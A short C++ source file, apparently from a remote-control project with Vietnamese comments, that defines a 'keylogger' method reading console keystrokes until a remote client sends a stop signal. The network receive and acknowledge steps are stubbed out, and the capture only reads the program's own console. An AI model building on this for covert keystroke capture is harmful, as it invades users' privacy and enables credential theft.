#include "KeyloggerObject.h"

std::string KLG_TransferObj::keylogger()
{
	std::string result = "";
	while (!checkStopSignal())
	{
		if (_kbhit())
		{
			char ch = _getch();
			result += ch;
		}
	}
	
	return result;
}

bool KLG_TransferObj::checkStopSignal()
{
	DataTransferObj stopSignal;

	// thao tác nhận tín hiệu từ client là đối tượng DataTransferObj stopSignal
	// ...


	if (stopSignal.getFuncType() == KLG && stopSignal.getCmdType() == STOP)
	{
		// gửi thông điệp đã nhận được tín hiệu cho client 
		// ...
		return true;
	}
	return false;
}
